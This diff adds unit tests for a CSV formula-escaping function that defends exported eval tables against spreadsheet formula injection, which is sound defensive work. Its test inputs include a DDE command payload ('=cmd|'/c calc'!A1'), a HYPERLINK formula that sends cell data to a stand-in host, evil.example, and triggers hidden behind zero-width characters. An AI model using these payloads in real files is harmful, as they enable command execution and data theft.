@@ -2,6 +2,7 @@ import { parse as parseCsv } from 'csv-parse/sync';
 import { beforeEach, describe, expect, it, vi } from 'vitest';
 import { ResultFailureReason } from '../../../src/types/index';
 import {
+  escapeCsvFormula,
   evalTableToCsv,
   evalTableToJson,
   getEvalTableOutputPromptLocationsBySize,
@@ -1835,6 +1836,78 @@ describe('evalTableUtils', () => {
       const bobP2Idx = bobLine!.indexOf('Bob-P2');
       expect(bobP1Idx).toBeLessThan(bobP2Idx);
     });
+  });
+});
+
+describe('escapeCsvFormula', () => {
+  it.each([
+    ['=1+1', "'=1+1"],
+    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
+    ['@SUM(A1:A9)', "'@SUM(A1:A9)"],
+    ['+1+1', "'+1+1"],
+    ['-1+1', "'-1+1"],
+    ['-2+cmd', "'-2+cmd"],
+  ])('prefixes formula trigger %p -> %p', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['\t=danger', "'\t=danger"],
+    ['\r=danger', "'\r=danger"],
+    ['  =danger', "'  =danger"],
+    ['\t@SUM(A1)', "'\t@SUM(A1)"],
+    ['\r-1+1', "'\r-1+1"],
+    ['\n\t =evil', "'\n\t =evil"],
+  ])('treats leading whitespace/control before a trigger as a formula (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['\u200B=1+1', "'\u200B=1+1"],
+    ['\u200C@SUM(A1)', "'\u200C@SUM(A1)"],
+    ['\u200D=cmd', "'\u200D=cmd"],
+  ])('escapes triggers hidden behind zero-width characters (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['-Infinity', "'-Infinity"],
+    ['+Infinity', "'+Infinity"],
+    ['-1e400', "'-1e400"],
+  ])('escapes non-finite numeric-looking values (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    [
+      '=HYPERLINK("https://evil.example?x="&A1,"click")',
+      '\'=HYPERLINK("https://evil.example?x="&A1,"click")',
+    ],
+    ["=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"],
+  ])('neutralizes real exfiltration/command payloads (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['-5', '-5'],
+    ['-5.25', '-5.25'],
+    ['-1e3', '-1e3'],
+    ['+5', '+5'],
+    ['+3.14', '+3.14'],
+  ])('leaves legitimate numbers untouched (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
+  });
+
+  it.each([
+    ['hello world', 'hello world'],
+    ['5-3', '5-3'],
+    ['a=b', 'a=b'],
+    ['user@example.com', 'user@example.com'],
+    ['', ''],
+    ['   ', '   '],
+    ['\t\t', '\t\t'],
+  ])('leaves non-formula values untouched (%p)', (input, expected) => {
+    expect(escapeCsvFormula(input)).toBe(expected);
   });
 });
 
